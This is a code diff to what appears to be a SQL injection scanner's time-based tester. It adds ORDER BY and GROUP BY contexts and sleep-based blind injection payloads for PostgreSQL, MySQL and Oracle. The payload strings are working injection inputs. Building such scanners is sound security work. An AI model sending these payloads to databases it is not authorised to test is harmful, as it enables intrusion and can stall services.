@@ -55,13 +55,15 @@ export class TimeBasedTester {
     const isNum = param.detectedContext === 'numeric' || /^\d+$/.test(param.originalValue.trim());
     const isDoubleQuote = param.detectedContext === 'double_quote_string';
     const isParenthesized = param.detectedContext === 'parenthesized_string';
+    const isOrderBy = param.detectedContext === 'order_by_clause' || param.detectedContext === 'group_by_clause';
     const probes: TimeDelayProbe[] = [];
 
     const expectedDelayMs = delaySeconds * 1000;
 
     // 1. PostgreSQL
     let pgPayload = `'||(SELECT pg_sleep(${delaySeconds}))||'`;
-    if (isNum) pgPayload = ` AND (SELECT pg_sleep(${delaySeconds}))`;
+    if (isOrderBy) pgPayload = `,(SELECT pg_sleep(${delaySeconds}))`;
+    else if (isNum) pgPayload = ` AND (SELECT pg_sleep(${delaySeconds}))`;
     else if (isDoubleQuote) pgPayload = `"||(SELECT pg_sleep(${delaySeconds}))||"`;
     else if (isParenthesized) pgPayload = `')||(SELECT pg_sleep(${delaySeconds}))||('`;
 
@@ -74,7 +76,8 @@ export class TimeBasedTester {
 
     // 2. MySQL / MariaDB
     let mysqlPayload = `' AND (SELECT 1 FROM (SELECT(SLEEP(${delaySeconds})))snt)-- -`;
-    if (isNum) mysqlPayload = ` AND (SELECT 1 FROM (SELECT(SLEEP(${delaySeconds})))snt)`;
+    if (isOrderBy) mysqlPayload = `,(SELECT SLEEP(${delaySeconds}))`;
+    else if (isNum) mysqlPayload = ` AND (SELECT 1 FROM (SELECT(SLEEP(${delaySeconds})))snt)`;
     else if (isDoubleQuote) mysqlPayload = `" AND (SELECT 1 FROM (SELECT(SLEEP(${delaySeconds})))snt)-- -`;
     else if (isParenthesized) mysqlPayload = `') AND (SELECT 1 FROM (SELECT(SLEEP(${delaySeconds})))snt)-- -`;
 
@@ -87,7 +90,8 @@ export class TimeBasedTester {
 
     // 3. Oracle
     let oraPayload = `'||(SELECT dbms_pipe.receive_message(('RDS'),${delaySeconds}) FROM DUAL)||'`;
-    if (isNum) oraPayload = ` AND (SELECT dbms_pipe.receive_message(('RDS'),${delaySeconds}) FROM DUAL)=1`;
+    if (isOrderBy) oraPayload = `,(SELECT dbms_pipe.receive_message(('RDS'),${delaySeconds}) FROM DUAL)`;
+    else if (isNum) oraPayload = ` AND (SELECT dbms_pipe.receive_message(('RDS'),${delaySeconds}) FROM DUAL)=1`;
     else if (isDoubleQuote) oraPayload = `"||(SELECT dbms_pipe.receive_message(('RDS'),${delaySeconds}) FROM DUAL)||"`;
     else if (isParenthesized) oraPayload = `')||(SELECT dbms_pipe.receive_message(('RDS'),${delaySeconds}) FROM DUAL)||('`;
 
